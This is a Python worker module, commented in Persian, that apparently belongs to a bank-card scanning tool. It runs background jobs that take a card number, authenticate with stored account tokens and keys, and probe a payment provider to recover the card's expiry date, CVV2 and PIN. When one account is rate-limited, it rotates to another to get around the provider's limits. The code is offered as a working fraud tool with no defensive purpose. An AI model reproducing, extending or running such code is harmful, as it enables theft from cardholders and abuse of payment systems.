"""
اجرای تسک‌های اسکن روی ورکر
مدیریت auth client و چرخش اکانت
"""
import asyncio

import db
from core.auth import IvaAuthClient
from core.scanner import SmartScanner
from core.constants import StorageKeys


async def run_scan_task(job: dict, params):
    """اجرای اسکن کارت در background"""
    try:
        # دریافت اکانت
        account = None
        if params.account_id:
            account = await db.get_account_by_id(params.account_id)

        if not account:
            accounts = await db.get_active_accounts()
            if not accounts:
                job["done"] = True
                job["status"] = "error"
                job["error"] = "اکانت فعالی موجود نیست"
                return
            account = accounts[0]

        # ساخت auth client
        key_store = _build_key_store(account)
        auth_client = IvaAuthClient(key_store=key_store)
        scanner = SmartScanner()

        # callback برای آپدیت وضعیت
        def on_progress(phase, current, total, found):
            job["phase"] = phase
            job["current_test"] = current
            job["total_tests"] = total
            if found.get("expire_month"):
                job["found_expiry"] = f"{found['expire_month']}/{found['expire_year']}"
            if found.get("cvv2"):
                job["found_cvv"] = found["cvv2"]

        async def on_log(msg):
            await db.add_log("info", "scan", f"[worker] {msg}")

        # بررسی توقف
        original_scan = scanner.scan_card

        async def _check_stopped():
            while not job.get("done"):
                if job.get("stopped"):
                    scanner.stop()
                    break
                await asyncio.sleep(1)

        stop_task = asyncio.create_task(_check_stopped())

        # اجرای اسکن
        result = await scanner.scan_card(
            pan=params.pan,
            auth_client=auth_client,
            target_mobile=params.target_mobile or None,
            provider_id=params.provider_id,
            amount=params.amount,
            on_progress=on_progress,
            on_log=on_log,
            delay=params.delay,
        )

        stop_task.cancel()

        # بروزرسانی جاب
        job["done"] = True
        if result.success:
            job["status"] = "success"
            job["success"] = True
            job["found_pin"] = result.pin
        elif result.rate_limited:
            job["status"] = "rate_limited"
            job["error"] = "محدودیت اکانت"
            # چرخش به اکانت بعدی
            await db.mark_account_limited(account["phone"])
        elif result.blocked:
            job["status"] = "blocked"
            job["error"] = "کارت مسدود"
        else:
            job["status"] = "failed"
            job["error"] = result.error_message

        await auth_client.close()

    except Exception as e:
        job["done"] = True
        job["status"] = "error"
        job["error"] = str(e)[:200]


def _build_key_store(account: dict) -> dict:
    """ساخت key_store از اطلاعات اکانت"""
    key_store = {}
    if account.get("token"):
        key_store[StorageKeys.TOKEN] = account["token"]
    if account.get("refresh_token"):
        key_store[StorageKeys.REFRESH_TOKEN] = account["refresh_token"]
    if account.get("shared_key"):
        key_store[StorageKeys.SHARED_KEY] = account["shared_key"]
    if account.get("working_key"):
        key_store[StorageKeys.WORKING_KEY] = account["working_key"]
    if account.get("rsa_public"):
        key_store[StorageKeys.RSA_PUBLIC] = account["rsa_public"]
    return key_store
